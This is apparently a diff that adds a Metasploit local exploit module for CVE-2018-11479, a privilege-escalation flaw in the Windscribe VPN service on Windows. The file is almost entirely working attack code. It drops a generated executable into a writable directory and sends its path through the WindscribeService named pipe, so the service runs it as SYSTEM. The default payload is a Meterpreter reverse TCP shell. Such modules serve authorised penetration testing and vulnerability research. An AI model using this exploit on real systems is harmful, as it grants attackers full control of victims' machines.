@@ -1,0 +1,156 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = ExcellentRanking
+
+  include Exploit::EXE
+  include Post::File
+  include Post::Windows::Priv
+  include Post::Windows::Services
+  include Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Windscribe WindscribeService Named Pipe Privilege Escalation',
+      'Description'    => %q{
+        The Windscribe VPN client application for Windows makes use of a
+        Windows service `WindscribeService.exe` which exposes a named pipe
+        `\\.\pipe\WindscribeService` allowing execution of programs with
+        elevated privileges.
+
+        Windscribe versions prior to 1.82 do not validate user-supplied
+        program names, allowing execution of arbitrary commands as SYSTEM.
+
+        This module has been tested successfully on Windscribe versions
+        1.80 and 1.81 on Windows 7 SP1 (x64).
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+      [
+        'Emin Ghuliev', # Discovery and exploit
+        'bcoles'        # Metasploit
+      ],
+      'References'     =>
+        [
+          ['CVE', '2018-11479'],
+          ['URL', 'http://blog.emingh.com/2018/05/windscribe-vpn-privilege-escalation.html'],
+          ['URL', 'https://pastebin.com/eLG3dpYK']
+        ],
+      'Platform'       => ['win'],
+      'SessionTypes'   => ['meterpreter'],
+      'Targets'        => [['Automatic', {}]],
+      'DisclosureDate' => '2018-05-24',
+      'DefaultOptions' =>
+        {
+          'PAYLOAD' => 'windows/meterpreter/reverse_tcp'
+        },
+      'Notes'          =>
+        {
+          'Reliability' => [ REPEATABLE_SESSION ],
+          'Stability'   => [ CRASH_SAFE ]
+        },
+      'DefaultTarget'  => 0))
+    register_advanced_options [
+      OptString.new('WritableDir', [false, 'A directory where we can write files (%TEMP% by default)', nil]),
+    ]
+  end
+
+  def base_dir
+    datastore['WritableDir'].blank? ? session.sys.config.getenv('TEMP') : datastore['WritableDir'].to_s
+  end
+
+  def service_exists?(service)
+    srv_info = service_info(service)
+
+    if srv_info.nil?
+      vprint_warning 'Unable to enumerate Windows services'
+      return false
+    end
+
+    if srv_info && srv_info[:display].empty?
+      return false
+    end
+
+    true
+  end
+
+  def write_named_pipe(pipe, command)
+    kt = "\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    kt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    kt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    kt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    kt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    kt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    kt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    kt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    kt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    kt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    kt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    kt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    kt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    kt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    kt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    kt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    kt << "\x00\x00\x00\x00"
+    kt << [command.force_encoding('UTF-8').codepoints.map { |c| "%04X" % c }.join].pack('H*')
+    kt << "\x00" * (32_005 - kt.length)
+
+    print_status "Sending #{command} to #{pipe} ..."
+
+    r = session.railgun.kernel32.CreateFileA(pipe, 'GENERIC_READ | GENERIC_WRITE', 0, nil, 'OPEN_EXISTING', 0, nil)
+    handle = r['return']
+
+    if handle == 0xffffffff # INVALID_HANDLE_VALUE
+      print_error "Invalid handle. #{pipe} named pipe not found, or already opened"
+      return false
+    end
+
+    vprint_good("Opended #{pipe}! Proceeding ...")
+
+    begin
+      w = client.railgun.kernel32.WriteFile(handle, kt, kt.length, 4, nil)
+      if w['return'] == false
+        return false
+      end
+    ensure
+      session.railgun.kernel32.CloseHandle(handle)
+    end
+
+    true
+  rescue
+    false
+  end
+
+  def check
+    service = 'WindscribeService'
+
+    unless service_exists? service
+      return CheckCode::Safe("Service '#{service}' does not exist")
+    end
+
+    CheckCode::Detected
+  end
+
+  def exploit
+    unless check == CheckCode::Detected
+      fail_with Failure::NotVulnerable, 'Target is not vulnerable'
+    end
+
+    if is_system?
+      fail_with Failure::BadConfig, 'Session already has SYSTEM privileges'
+    end
+
+    payload_path = "#{base_dir}\\#{Rex::Text.rand_text_alphanumeric(8..10)}.exe"
+    payload_exe = generate_payload_exe
+    vprint_status "Writing payload (#{payload.encoded.length} bytes) to #{payload_path} ..."
+    write_file payload_path, payload_exe
+    register_file_for_cleanup payload_path
+
+    unless write_named_pipe("\\\\.\\pipe\\WindscribeService", payload_path)
+      fail_with Failure::Unknown, 'Failed to write to pipe'
+    end
+  end
+end
